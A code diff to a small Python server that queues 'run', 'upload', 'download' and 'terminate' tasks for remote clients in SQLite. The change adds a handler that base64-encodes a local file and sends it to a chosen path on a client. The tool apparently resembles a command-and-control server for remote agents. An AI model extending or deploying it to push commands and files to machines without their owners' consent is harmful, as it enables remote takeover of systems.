@@ -1,6 +1,7 @@
 import sqlite3
 import os
 from datetime import datetime
+import base64
 
 DB_PATH = "tasks.db"
 
@@ -35,13 +36,20 @@ def init_db(conn):
     conn.commit()
 
 
-def add_task(conn, client_id, action, args):
+def add_task(conn, client_id, action, args, path = None):
     now = now_iso()
-    conn.execute(
-        "INSERT INTO tasks (client_id, action, args, status, created_at) VALUES (?, ?, ?, 'pending', ?)",
-        (client_id, action, args, now)
-    )
-    conn.commit()
+    if path:
+        conn.execute(
+        "INSERT INTO tasks (client_id, action, args, status, created_at, path) VALUES (?, ?, ?, 'pending', ?, ?)",
+        (client_id, action, args, now, path)
+        )
+        conn.commit()
+    else:
+        conn.execute(
+            "INSERT INTO tasks (client_id, action, args, status, created_at) VALUES (?, ?, ?, 'pending', ?)",
+            (client_id, action, args, now)
+        )
+        conn.commit()
     print(f"Added task '{action}' for {client_id or 'ANY'}")
 
 
@@ -114,8 +122,13 @@ def repl():
             client_id = None if parts[1].upper() == "ANY" else parts[1]
             action = parts[2]
             args = parts[3] if len(parts) > 3 else ""
-            if action in ("run", "upload", "download", "terminate"):
+            if action in ("run", "upload", "terminate"):
                 add_task(conn, client_id, action, args)
+            elif action == "download":
+                name, filepath = args.split(" ")
+                with open(os.path.join("downloads", name), "rb") as file:
+                    data = base64.b64encode(file.read()).decode("utf-8")
+                add_task(conn, client_id, action, data, path=filepath)
             else:
                 print("Invalid command type.")
         elif cmd.startswith("list"):
